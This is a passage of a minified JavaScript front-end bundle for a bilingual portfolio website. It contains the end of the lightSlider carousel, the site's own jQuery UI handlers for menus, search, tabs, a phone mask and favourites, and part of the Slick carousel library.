                                e.preventDefault ? e.preventDefault() : e.returnValue = !1, e.stopImmediatePropagation(), e.stopPropagation(), T(window).off("click.ls")
                            }), i.touchEnd(t)
                        }
                    })
                }
            },
            enableTouch: function() {
                var o = this;
                if (k) {
                    var s = {},
                        r = {};
                    h.on("touchstart", function(e) {
                        r = e.originalEvent.targetTouches[0], s.pageX = e.originalEvent.targetTouches[0].pageX, s.pageY = e.originalEvent.targetTouches[0].pageY, clearInterval(l)
                    }), h.on("touchmove", function(e) {
                        if (p < f && 0 !== p) return !1;
                        var t = e.originalEvent;
                        r = t.targetTouches[0];
                        var i = Math.abs(r.pageX - s.pageX),
                            n = Math.abs(r.pageY - s.pageY);
                        !0 === c.vertical ? (i < 3 * n && e.preventDefault(), o.touchMove(r.pageY, s.pageY)) : (n < 3 * i && e.preventDefault(), o.touchMove(r.pageX, s.pageX))
                    }), h.on("touchend", function() {
                        if (p < f && 0 !== p) return !1;
                        var e;
                        e = !0 === c.vertical ? r.pageY - s.pageY : r.pageX - s.pageX, o.touchEnd(e)
                    })
                }
            },
            build: function() {
                var e = this;
                e.initialStyle(), this.doCss() && (!0 === c.enableTouch && e.enableTouch(), !0 === c.enableDrag && e.enableDrag()), T(window).on("focus", function() {
                    e.auto()
                }), T(window).on("blur", function() {
                    clearInterval(l)
                }), e.pager(), e.pauseOnHover(), e.controls(), e.keyPress()
            }
        }).build(), S.init = function() {
            S.chbreakpoint(), !0 === c.vertical ? (f = 1 < c.item ? c.verticalHeight : d.outerHeight(), h.css("height", f + "px")) : f = h.outerWidth(), !0 === c.loop && "slide" === c.mode && S.clone(), S.calL(), "slide" === c.mode && u.removeClass("lSSlide"), "slide" === c.mode && (S.calSW(), S.sSW()), setTimeout(function() {
                "slide" === c.mode && u.addClass("lSSlide")
            }, 1e3), c.pager && S.createPager(), !0 === c.adaptiveHeight && !1 === c.vertical && u.css("height", d.eq(v).outerHeight(!0)), !1 === c.adaptiveHeight && ("slide" === c.mode ? !1 === c.vertical ? i.setHeight(u, !1) : i.auto() : i.setHeight(u, !0)), !0 === c.gallery && i.slideThumb(), "slide" === c.mode && i.slide(), !1 === c.autoWidth ? d.length <= c.item ? h.find(".lSAction").hide() : h.find(".lSAction").show() : S.calWidth(!1) < f && 0 !== p ? h.find(".lSAction").hide() : h.find(".lSAction").show()
        }, u.goToPrevSlide = function() {
            0 < v ? (c.onBeforePrevSlide.call(this, u, v), v--, u.mode(!1), !0 === c.gallery && i.slideThumb()) : !0 === c.loop ? (c.onBeforePrevSlide.call(this, u, v), "fade" === c.mode && (v = parseInt((a - 1) / c.slideMove)), u.mode(!1), !0 === c.gallery && i.slideThumb()) : !0 === c.slideEndAnimation && (u.addClass("leftEnd"), setTimeout(function() {
                u.removeClass("leftEnd")
            }, 400))
        }, u.goToNextSlide = function() {
            var e = !0;
            "slide" === c.mode && (e = i.slideValue() < p - f - c.slideMargin), v * c.slideMove < a - c.slideMove && e ? (c.onBeforeNextSlide.call(this, u, v), v++, u.mode(!1), !0 === c.gallery && i.slideThumb()) : !0 === c.loop ? (c.onBeforeNextSlide.call(this, u, v), v = 0, u.mode(!1), !0 === c.gallery && i.slideThumb()) : !0 === c.slideEndAnimation && (u.addClass("rightEnd"), setTimeout(function() {
                u.removeClass("rightEnd")
            }, 400))
        }, u.mode = function(e) {
            !0 === c.adaptiveHeight && !1 === c.vertical && u.css("height", d.eq(v).outerHeight(!0)), !1 === t && ("slide" === c.mode ? i.doCss() && (u.addClass("lSSlide"), "" !== c.speed && h.css("transition-duration", c.speed + "ms"), "" !== c.cssEasing && h.css("transition-timing-function", c.cssEasing)) : i.doCss() && ("" !== c.speed && u.css("transition-duration", c.speed + "ms"), "" !== c.cssEasing && u.css("transition-timing-function", c.cssEasing))), e || c.onBeforeSlide.call(this, u, v), "slide" === c.mode ? i.slide() : i.fade(), h.hasClass("ls-hover") || i.auto(), setTimeout(function() {
                e || c.onAfterSlide.call(this, u, v)
            }, c.speed), t = !0
        }, u.play = function() {
            u.goToNextSlide(), c.auto = !0, i.auto()
        }, u.pause = function() {
            c.auto = !1, clearInterval(l)
        }, u.refresh = function() {
            S.init()
        }, u.getCurrentSlideCount = function() {
            var e = v;
            if (c.loop) {
                var t = h.find(".lslide").length,
                    i = u.find(".clone.left").length;
                e = v <= i - 1 ? t + (v - i) : t + i <= v ? v - t - i : v - i
            }
            return e + 1
        }, u.getTotalSlideCount = function() {
            return h.find(".lslide").length
        }, u.goToSlide = function(e) {
            v = c.loop ? e + u.find(".clone.left").length - 1 : e, u.mode(!1), !0 === c.gallery && i.slideThumb()
        }, u.destroy = function() {
            u.lightSlider && (u.goToPrevSlide = function() {}, u.goToNextSlide = function() {}, u.mode = function() {}, u.play = function() {}, u.pause = function() {}, u.refresh = function() {}, u.getCurrentSlideCount = function() {}, u.getTotalSlideCount = function() {}, u.goToSlide = function() {}, u.lightSlider = null, S = {
                init: function() {}
            }, u.parent().parent().find(".lSAction, .lSPager").remove(), u.removeClass("lightSlider lSFade lSSlide lsGrab lsGrabbing leftEnd right").removeAttr("style").unwrap().unwrap(), u.children().removeAttr("style"), d.removeClass("lslide active"), u.find(".clone").remove(), l = d = null, t = !1, v = 0)
        }, setTimeout(function() {
            c.onSliderLoad.call(this, u)
        }, 10), T(window).on("resize orientationchange", function(e) {
            setTimeout(function() {
                e.preventDefault ? e.preventDefault() : e.returnValue = !1, S.init()
            }, 200)
        }), this
    }
}, function(e, t, i) {
    "use strict";
    $(function() {
        var e = "";
        $(window).resize(function() {
            0 < $(".project-list").length && !$(".project-list").hasClass("mini") && $(window).width() < 1300 && (e = $(".project-list")[0].innerHTML, $(".project-list").addClass("mini"), $('.project-list .row .row [class*="col-"]').addClass("project-mini"), $('.project-list .row> [class*="col-"]').unwrap().wrapAll('<div class="row"></div>'), $(".col-xl-6.col-md-12").remove()), e && 1300 < $(window).width() && $(".project-list").hasClass("mini") && ($(".project-list").html(e), e = "", $(".project-list").removeClass("mini"))
        }), $(window).resize(), $(".team-list__item").click(function() {
            $(".team-list__detail").parent().animate({
                marginBottom: 0
            });
            var e = $(this).next(".team-list__detail");
            $(".team-list__detail").not(e).removeClass("open"), e.toggleClass("open"), e.hasClass("open") && ($(this).parent().stop().animate({
                marginBottom: $(e).height() + 10
            }), setTimeout(function() {
                $("html, body").animate({
                    scrollTop: e.offset().top - 80
                }, 700)
            }, 300))
        }), setTimeout(function() {
            $('.jq-selectbox__dropdown li:contains("За всё время")').addClass("button button_gray").parents("ul").addClass("with-btn"), $('.jq-selectbox__dropdown li:contains("For all the time")').addClass("button button_gray").parents("ul").addClass("with-btn")
        }, 400), $('input[name="phone1"],input[name="PHONE1"]').mask("+7 (999) 999-99-99", {
            placeholder: "+7 ( ___ ) ___ - __ - __"
        }), $(".tabs a").click(function(e) {
            $(".tabs a").removeClass("is_active"), $(this).addClass("is_active"), $(".tab_wr .tab").hide(), $(".tab_wr .tab:eq(" + $(this).index() + ")").show(), e.preventDefault()
        }), $(".addtofav").click(function() {
            var t = $(this);
            return $.post("/local/ajax/favorite.php", "FID=" + $(this).attr("data-id"), function(e) {
                "success" == e && console.log('test'), $(t).toggleClass("is_active"), $(t).hasClass("is_active") ? $(t).html($(t).attr("data-remove")) : $(t).html($(t).attr("data-add")).closest('.portfolio-list__item').fadeOut()
            }), !1
        }), $(".show_text").click(function(e) {
            var n = $(e.target).data("lang");
            $(".show_text").text(function(e, t) {
                var i;
                return console.log(n), console.log(t), "ru" == n ? i = "Скрыть" === t ? "Узнать больше о проекте" : "Скрыть" : "en" == n && (i = "Hide text" === t ? "Show text" : "Hide text"), i
            }), $(".hide_text").toggle(400)
        })
    }), $(function() {
        function e() {
            var e = $(".portfolio-box__video .video-js"),
                t = $(".portfolio-box img").height();
            e.css("height", t)
        }
        $(".portfolio-box__video") && ($(window).resize(e), $(document).ready(e), $(document).ready(function() {
            var e = $(".portfolio-box__video-embed iframe"),
                t = $(".portfolio-box img").height();
            e.css("height", t)
        }))
    }), $(function() {
        function e() {
            var e = $(".row-video-embed").width() / 1.585;
            $(".row-video-embed iframe").height(e)
        }
        $(window).resize(e), $(document).ready(e)
    })
}, function(e, t, i) {
    "use strict";
    $(function() {
        $(".search-block__close").click(function() {
            $(".search-bloc").removeClass("open"), $(".overlay").removeClass("open")
        }), $(".header__search").click(function(e) {
            $(".search-bloc").addClass("open"), e.preventDefault(), $(".overlay").addClass("open")
        }), $(".go-up").click(function() {
            $("html, body").animate({
                scrollTop: 0
            }, "slow")
        }), $(".menu-button").click(function() {
            $(".menu-button").toggleClass("is-active"), $(".header-popup").toggleClass("open"), $(this).hasClass("is-active") ? $(".headerShow").length ? $(".header-popup__full").slideDown() : $(".header-popup__full").show() : $(".headerShow").length ? $(".header-popup__full").slideUp() : setTimeout(function() {
                $(".header-popup__full").hide()
            }, 500)
        }), $("body").on("click", ".callback-form__close,.overlay", function() {
            $(".callback-form,.overlay").removeClass("open"), $(".search-bloc").removeClass("open")
        }), $(".show-callback").click(function(e) {
            $(".callback-form,.overlay").addClass("open"), e.preventDefault()
        }), $(".overlay.open").click(function() {
            alert("sadaw wdw"), $(".search-bloc").removeClass("open")
        }), $(".header-popup__full li span").click(function() {
            $(this).toggleClass("open")
        });
        var e = document.documentElement,
            t = !1,
            i = 0,
            n = 0,
            o = !1;
        window.addEventListener("scroll", function() {
            400 < (i = window.scrollY) ? $(".go-up").addClass("show") : $(".go-up").removeClass("show"), i < 80 ? e.classList.remove("headerShow") : (n < i ? (t && i < 80 ? (e.classList.add("headerShow"), t = !1) : !t && 80 <= i && (e.classList.remove("headerShow"), t = !0), o = !1) : (o || (o = i), t && (80 <= o - i || i <= 80) && (e.classList.add("headerShow"), t = !1)), n = i)
        })
    })
}, function(e, t, i) {
    "use strict";
    var n, o, s, a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
        return typeof e
    } : function(e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
    };
    o = [i(0)], void 0 === (s = "function" == typeof(n = function(d) {
        var o, r = window.Slick || {};
        (o = 0, r = function(e, t) {
            var i, n = this;
            n.defaults = {
                accessibility: !0,
                adaptiveHeight: !1,
                appendArrows: d(e),
                appendDots: d(e),
                arrows: !0,
                asNavFor: null,
                prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
                nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
                autoplay: !1,
                autoplaySpeed: 3e3,
                centerMode: !1,
                centerPadding: "50px",
                cssEase: "ease",
                customPaging: function(e, t) {
                    return d('<button type="button" />').text(t + 1)
                },
                dots: !1,
                dotsClass: "slick-dots",
                draggable: !0,
                easing: "linear",
                edgeFriction: .35,
                fade: !1,
                focusOnSelect: !1,
                focusOnChange: !1,
                infinite: !0,
                initialSlide: 0,
                lazyLoad: "ondemand",
                mobileFirst: !1,
                pauseOnHover: !0,
                pauseOnFocus: !0,
                pauseOnDotsHover: !1,
                respondTo: "window",
                responsive: null,
                rows: 1,
                rtl: !1,
                slide: "",
                slidesPerRow: 1,
                slidesToShow: 1,
                slidesToScroll: 1,
                speed: 500,
                swipe: !0,
                swipeToSlide: !1,
                touchMove: !0,
                touchThreshold: 5,
                useCSS: !0,
                useTransform: !0,
                variableWidth: !1,
                vertical: !1,
                verticalSwiping: !1,
                waitForAnimate: !0,
                zIndex: 1e3
            }, n.initials = {
                animating: !1,
                dragging: !1,
                autoPlayTimer: null,
                currentDirection: 0,
                currentLeft: null,
                currentSlide: 0,
                direction: 1,
                $dots: null,
                listWidth: null,
                listHeight: null,
                loadIndex: 0,
                $nextArrow: null,
                $prevArrow: null,
                scrolling: !1,
                slideCount: null,
                slideWidth: null,
                $slideTrack: null,
                $slides: null,
                sliding: !1,
                slideOffset: 0,
                swipeLeft: null,
                swiping: !1,
                $list: null,
                touchObject: {},
                transformsEnabled: !1,
                unslicked: !1
            }, d.extend(n, n.initials), n.activeBreakpoint = null, n.animType = null, n.animProp = null, n.breakpoints = [], n.breakpointSettings = [], n.cssTransitions = !1, n.focussed = !1, n.interrupted = !1, n.hidden = "hidden", n.paused = !0, n.positionProp = null, n.respondTo = null, n.rowCount = 1, n.shouldClick = !0, n.$slider = d(e), n.$slidesCache = null, n.transformType = null, n.transitionType = null, n.visibilityChange = "visibilitychange", n.windowWidth = 0, n.windowTimer = null, i = d(e).data("slick") || {}, n.options = d.extend({}, n.defaults, t, i), n.currentSlide = n.options.initialSlide, n.originalSettings = n.options, void 0 !== document.mozHidden ? (n.hidden = "mozHidden", n.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (n.hidden = "webkitHidden", n.visibilityChange = "webkitvisibilitychange"), n.autoPlay = d.proxy(n.autoPlay, n), n.autoPlayClear = d.proxy(n.autoPlayClear, n), n.autoPlayIterator = d.proxy(n.autoPlayIterator, n), n.changeSlide = d.proxy(n.changeSlide, n), n.clickHandler = d.proxy(n.clickHandler, n), n.selectHandler = d.proxy(n.selectHandler, n), n.setPosition = d.proxy(n.setPosition, n), n.swipeHandler = d.proxy(n.swipeHandler, n), n.dragHandler = d.proxy(n.dragHandler, n), n.keyHandler = d.proxy(n.keyHandler, n), n.instanceUid = o++, n.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, n.registerBreakpoints(), n.init(!0)
        }).prototype.activateADA = function() {
            this.$slideTrack.find(".slick-active").attr({
                "aria-hidden": "false"
            }).find("a, input, button, select").attr({
                tabindex: "0"
            })
        }, r.prototype.addSlide = r.prototype.slickAdd = function(e, t, i) {
            var n = this;
            if ("boolean" == typeof t) i = t, t = null;
            else if (t < 0 || t >= n.slideCount) return !1;
            n.unload(), "number" == typeof t ? 0 === t && 0 === n.$slides.length ? d(e).appendTo(n.$slideTrack) : i ? d(e).insertBefore(n.$slides.eq(t)) : d(e).insertAfter(n.$slides.eq(t)) : !0 === i ? d(e).prependTo(n.$slideTrack) : d(e).appendTo(n.$slideTrack), n.$slides = n.$slideTrack.children(this.options.slide), n.$slideTrack.children(this.options.slide).detach(), n.$slideTrack.append(n.$slides), n.$slides.each(function(e, t) {
                d(t).attr("data-slick-index", e)
            }), n.$slidesCache = n.$slides, n.reinit()
        }, r.prototype.animateHeight = function() {
            var e = this;
            if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
                var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
                e.$list.animate({
                    height: t
                }, e.options.speed)
            }
        }, r.prototype.animateSlide = function(e, t) {
            var i = {},
                n = this;
            n.animateHeight(), !0 === n.options.rtl && !1 === n.options.vertical && (e = -e), !1 === n.transformsEnabled ? !1 === n.options.vertical ? n.$slideTrack.animate({
                left: e
            }, n.options.speed, n.options.easing, t) : n.$slideTrack.animate({
                top: e
            }, n.options.speed, n.options.easing, t) : !1 === n.cssTransitions ? (!0 === n.options.rtl && (n.currentLeft = -n.currentLeft), d({
                animStart: n.currentLeft
            }).animate({
                animStart: e
            }, {
                duration: n.options.speed,
                easing: n.options.easing,
                step: function(e) {
                    e = Math.ceil(e), !1 === n.options.vertical ? i[n.animType] = "translate(" + e + "px, 0px)" : i[n.animType] = "translate(0px," + e + "px)", n.$slideTrack.css(i)
                },
                complete: function() {
                    t && t.call()
                }
            })) : (n.applyTransition(), e = Math.ceil(e), !1 === n.options.vertical ? i[n.animType] = "translate3d(" + e + "px, 0px, 0px)" : i[n.animType] = "translate3d(0px," + e + "px, 0px)", n.$slideTrack.css(i), t && setTimeout(function() {
                n.disableTransition(), t.call()
            }, n.options.speed))
        }, r.prototype.getNavTarget = function() {
            var e = this.options.asNavFor;
            return e && null !== e && (e = d(e).not(this.$slider)), e
        }, r.prototype.asNavFor = function(t) {
            var e = this.getNavTarget();
            null !== e && "object" == (void 0 === e ? "undefined" : a(e)) && e.each(function() {
                var e = d(this).slick("getSlick");
                e.unslicked || e.slideHandler(t, !0)
            })
        }, r.prototype.applyTransition = function(e) {
            var t = this,
                i = {};
            !1 === t.options.fade ? i[t.transitionType] = t.transformType + " " + t.options.speed + "ms " + t.options.cssEase : i[t.transitionType] = "opacity " + t.options.speed + "ms " + t.options.cssEase, !1 === t.options.fade ? t.$slideTrack.css(i) : t.$slides.eq(e).css(i)
        }, r.prototype.autoPlay = function() {
            var e = this;
            e.autoPlayClear(), e.slideCount > e.options.slidesToShow && (e.autoPlayTimer = setInterval(e.autoPlayIterator, e.options.autoplaySpeed))
        }, r.prototype.autoPlayClear = function() {
            this.autoPlayTimer && clearInterval(this.autoPlayTimer)
        }, r.prototype.autoPlayIterator = function() {
            var e = this,
                t = e.currentSlide + e.options.slidesToScroll;
            e.paused || e.interrupted || e.focussed || (!1 === e.options.infinite && (1 === e.direction && e.currentSlide + 1 === e.slideCount - 1 ? e.direction = 0 : 0 === e.direction && (t = e.currentSlide - e.options.slidesToScroll, e.currentSlide - 1 == 0 && (e.direction = 1))), e.slideHandler(t))
        }, r.prototype.buildArrows = function() {
            var e = this;
            !0 === e.options.arrows && (e.$prevArrow = d(e.options.prevArrow).addClass("slick-arrow"), e.$nextArrow = d(e.options.nextArrow).addClass("slick-arrow"), e.slideCount > e.options.slidesToShow ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows), e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows), !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({
                "aria-disabled": "true",
                tabindex: "-1"
            }))
        }, r.prototype.buildDots = function() {
            var e, t, i = this;
            if (!0 === i.options.dots) {
                for (i.$slider.addClass("slick-dotted"), t = d("<ul />").addClass(i.options.dotsClass), e = 0; e <= i.getDotCount(); e += 1) t.append(d("<li />").append(i.options.customPaging.call(this, i, e)));
                i.$dots = t.appendTo(i.options.appendDots), i.$dots.find("li").first().addClass("slick-active")
            }
        }, r.prototype.buildOut = function() {
            var e = this;
            e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), e.slideCount = e.$slides.length, e.$slides.each(function(e, t) {
                d(t).attr("data-slick-index", e).data("originalStyling", d(t).attr("style") || "")
            }), e.$slider.addClass("slick-slider"), e.$slideTrack = 0 === e.slideCount ? d('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent(), e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent(), e.$slideTrack.css("opacity", 0), !0 !== e.options.centerMode && !0 !== e.options.swipeToSlide || (e.options.slidesToScroll = 1), d("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"), e.setupInfinite(), e.buildArrows(), e.buildDots(), e.updateDots(), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), !0 === e.options.draggable && e.$list.addClass("draggable")
        }, r.prototype.buildRows = function() {
            var e, t, i, n, o, s, r, a = this;
            if (n = document.createDocumentFragment(), s = a.$slider.children(), 1 < a.options.rows) {
                for (r = a.options.slidesPerRow * a.options.rows, o = Math.ceil(s.length / r), e = 0; e < o; e++) {
                    var l = document.createElement("div");
                    for (t = 0; t < a.options.rows; t++) {
                        var d = document.createElement("div");
                        for (i = 0; i < a.options.slidesPerRow; i++) {
                            var c = e * r + (t * a.options.slidesPerRow + i);
                            s.get(c) && d.appendChild(s.get(c))
                        }
                        l.appendChild(d)
                    }
                    n.appendChild(l)
                }
                a.$slider.empty().append(n), a.$slider.children().children().children().css({
                    width: 100 / a.options.slidesPerRow + "%",
                    display: "inline-block"
                })
            }
        }, r.prototype.checkResponsive = function(e, t) {
            var i, n, o, s = this,
                r = !1,
                a = s.$slider.width(),
                l = window.innerWidth || d(window).width();
            if ("window" === s.respondTo ? o = l : "slider" === s.respondTo ? o = a : "min" === s.respondTo && (o = Math.min(l, a)), s.options.responsive && s.options.responsive.length && null !== s.options.responsive) {
                for (i in n = null, s.breakpoints) s.breakpoints.hasOwnProperty(i) && (!1 === s.originalSettings.mobileFirst ? o < s.breakpoints[i] && (n = s.breakpoints[i]) : o > s.breakpoints[i] && (n = s.breakpoints[i]));
                null !== n ? null !== s.activeBreakpoint ? (n !== s.activeBreakpoint || t) && (s.activeBreakpoint = n, "unslick" === s.breakpointSettings[n] ? s.unslick(n) : (s.options = d.extend({}, s.originalSettings, s.breakpointSettings[n]), !0 === e && (s.currentSlide = s.options.initialSlide), s.refresh(e)), r = n) : (s.activeBreakpoint = n, "unslick" === s.breakpointSettings[n] ? s.unslick(n) : (s.options = d.extend({}, s.originalSettings, s.breakpointSettings[n]), !0 === e && (s.currentSlide = s.options.initialSlide), s.refresh(e)), r = n) : null !== s.activeBreakpoint && (s.activeBreakpoint = null, s.options = s.originalSettings, !0 === e && (s.currentSlide = s.options.initialSlide), s.refresh(e), r = n), e || !1 === r || s.$slider.trigger("breakpoint", [s, r])
            }
        }, r.prototype.changeSlide = function(e, t) {
            var i, n, o = this,
                s = d(e.currentTarget);
            switch (s.is("a") && e.preventDefault(), s.is("li") || (s = s.closest("li")), i = o.slideCount % o.options.slidesToScroll != 0 ? 0 : (o.slideCount - o.currentSlide) % o.options.slidesToScroll, e.data.message) {
                case "previous":
                    n = 0 === i ? o.options.slidesToScroll : o.options.slidesToShow - i, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide - n, !1, t);
                    break;
                case "next":
                    n = 0 === i ? o.options.slidesToScroll : i, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide + n, !1, t);
                    break;
                case "index":
                    var r = 0 === e.data.index ? 0 : e.data.index || s.index() * o.options.slidesToScroll;
                    o.slideHandler(o.checkNavigable(r), !1, t), s.children().trigger("focus");
                    break;
                default:
                    return
            }
        }, r.prototype.checkNavigable = function(e) {
            var t, i;
            if (i = 0, e > (t = this.getNavigableIndexes())[t.length - 1]) e = t[t.length - 1];
            else
                for (var n in t) {
                    if (e < t[n]) {
                        e = i;
                        break
                    }
                    i = t[n]
                }
            return e
        }, r.prototype.cleanUpEvents = function() {
            var e = this;
            e.options.dots && null !== e.$dots && (d("li", e.$dots).off("click.slick", e.changeSlide).off("mouseenter.slick", d.proxy(e.interrupt, e, !0)).off("mouseleave.slick", d.proxy(e.interrupt, e, !1)), !0 === e.options.accessibility && e.$dots.off("keydown.slick", e.keyHandler)), e.$slider.off("focus.slick blur.slick"), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide), e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide), !0 === e.options.accessibility && (e.$prevArrow && e.$prevArrow.off("keydown.slick", e.keyHandler), e.$nextArrow && e.$nextArrow.off("keydown.slick", e.keyHandler))), e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler), e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler), e.$list.off("touchend.slick mouseup.slick", e.swipeHandler), e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler), e.$list.off("click.slick", e.clickHandler), d(document).off(e.visibilityChange, e.visibility), e.cleanUpSlideEvents(), !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && d(e.$slideTrack).children().off("click.slick", e.selectHandler), d(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange), d(window).off("resize.slick.slick-" + e.instanceUid, e.resize), d("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault), d(window).off("load.slick.slick-" + e.instanceUid, e.setPosition)
        }, r.prototype.cleanUpSlideEvents = function() {
            var e = this;
            e.$list.off("mouseenter.slick", d.proxy(e.interrupt, e, !0)), e.$list.off("mouseleave.slick", d.proxy(e.interrupt, e, !1))
        }, r.prototype.cleanUpRows = function() {
            var e;
            1 < this.options.rows && ((e = this.$slides.children().children()).removeAttr("style"), this.$slider.empty().append(e))
        }, r.prototype.clickHandler = function(e) {
            !1 === this.shouldClick && (e.stopImmediatePropagation(), e.stopPropagation(), e.preventDefault())
        }, r.prototype.destroy = function(e) {
            var t = this;
            t.autoPlayClear(), t.touchObject = {}, t.cleanUpEvents(), d(".slick-cloned", t.$slider).detach(), t.$dots && t.$dots.remove(), t.$prevArrow && t.$prevArrow.length && (t.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove()), t.$nextArrow && t.$nextArrow.length && (t.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove()), t.$slides && (t.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function() {
                d(this).attr("style", d(this).data("originalStyling"))
            }), t.$slideTrack.children(this.options.slide).detach(), t.$slideTrack.detach(), t.$list.detach(), t.$slider.append(t.$slides)), t.cleanUpRows(), t.$slider.removeClass("slick-slider"), t.$slider.removeClass("slick-initialized"), t.$slider.removeClass("slick-dotted"), t.unslicked = !0, e || t.$slider.trigger("destroy", [t])
        }, r.prototype.disableTransition = function(e) {
            var t = {};
            t[this.transitionType] = "", !1 === this.options.fade ? this.$slideTrack.css(t) : this.$slides.eq(e).css(t)
        }, r.prototype.fadeSlide = function(e, t) {
            var i = this;
            !1 === i.cssTransitions ? (i.$slides.eq(e).css({
                zIndex: i.options.zIndex
            }), i.$slides.eq(e).animate({
                opacity: 1
            }, i.options.speed, i.options.easing, t)) : (i.applyTransition(e), i.$slides.eq(e).css({
                opacity: 1,
                zIndex: i.options.zIndex
            }), t && setTimeout(function() {
                i.disableTransition(e), t.call()
            }, i.options.speed))
        }, r.prototype.fadeSlideOut = function(e) {
            var t = this;
            !1 === t.cssTransitions ? t.$slides.eq(e).animate({
                opacity: 0,
                zIndex: t.options.zIndex - 2
            }, t.options.speed, t.options.easing) : (t.applyTransition(e), t.$slides.eq(e).css({
                opacity: 0,
                zIndex: t.options.zIndex - 2
            }))
        }, r.prototype.filterSlides = r.prototype.slickFilter = function(e) {
            var t = this;
            null !== e && (t.$slidesCache = t.$slides, t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.filter(e).appendTo(t.$slideTrack), t.reinit())
        }, r.prototype.focusHandler = function() {
            var i = this;
            i.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*", function(e) {
                e.stopImmediatePropagation();
                var t = d(this);
                setTimeout(function() {
                    i.options.pauseOnFocus && (i.focussed = t.is(":focus"), i.autoPlay())
                }, 0)
            })
        }, r.prototype.getCurrent = r.prototype.slickCurrentSlide = function() {
            return this.currentSlide
        }, r.prototype.getDotCount = function() {
            var e = this,
                t = 0,
                i = 0,
                n = 0;
            if (!0 === e.options.infinite)
                if (e.slideCount <= e.options.slidesToShow) ++n;
                else
                    for (; t < e.slideCount;) ++n, t = i + e.options.slidesToScroll, i += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
            else if (!0 === e.options.centerMode) n = e.slideCount;
            else if (e.options.asNavFor)
                for (; t < e.slideCount;) ++n, t = i + e.options.slidesToScroll, i += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
            else n = 1 + Math.ceil((e.slideCount - e.options.slidesToShow) / e.options.slidesToScroll);
            return n - 1
        }, r.prototype.getLeft = function(e) {
            var t, i, n, o, s = this,
                r = 0;
            return s.slideOffset = 0, i = s.$slides.first().outerHeight(!0), !0 === s.options.infinite ? (s.slideCount > s.options.slidesToShow && (s.slideOffset = s.slideWidth * s.options.slidesToShow * -1, o = -1, !0 === s.options.vertical && !0 === s.options.centerMode && (2 === s.options.slidesToShow ? o = -1.5 : 1 === s.options.slidesToShow && (o = -2)), r = i * s.options.slidesToShow * o), s.slideCount % s.options.slidesToScroll != 0 && e + s.options.slidesToScroll > s.slideCount && s.slideCount > s.options.slidesToShow && (r = e > s.slideCount ? (s.slideOffset = (s.options.slidesToShow - (e - s.slideCount)) * s.slideWidth * -1, (s.options.slidesToShow - (e - s.slideCount)) * i * -1) : (s.slideOffset = s.slideCount % s.options.slidesToScroll * s.slideWidth * -1, s.slideCount % s.options.slidesToScroll * i * -1))) : e + s.options.slidesToShow > s.slideCount && (s.slideOffset = (e + s.options.slidesToShow - s.slideCount) * s.slideWidth, r = (e + s.options.slidesToShow - s.slideCount) * i), s.slideCount <= s.options.slidesToShow && (r = s.slideOffset = 0), !0 === s.options.centerMode && s.slideCount <= s.options.slidesToShow ? s.slideOffset = s.slideWidth * Math.floor(s.options.slidesToShow) / 2 - s.slideWidth * s.slideCount / 2 : !0 === s.options.centerMode && !0 === s.options.infinite ? s.slideOffset += s.slideWidth * Math.floor(s.options.slidesToShow / 2) - s.slideWidth : !0 === s.options.centerMode && (s.slideOffset = 0, s.slideOffset += s.slideWidth * Math.floor(s.options.slidesToShow / 2)), t = !1 === s.options.vertical ? e * s.slideWidth * -1 + s.slideOffset : e * i * -1 + r, !0 === s.options.variableWidth && (n = s.slideCount <= s.options.slidesToShow || !1 === s.options.infinite ? s.$slideTrack.children(".slick-slide").eq(e) : s.$slideTrack.children(".slick-slide").eq(e + s.options.slidesToShow), t = !0 === s.options.rtl ? n[0] ? -1 * (s.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, !0 === s.options.centerMode && (n = s.slideCount <= s.options.slidesToShow 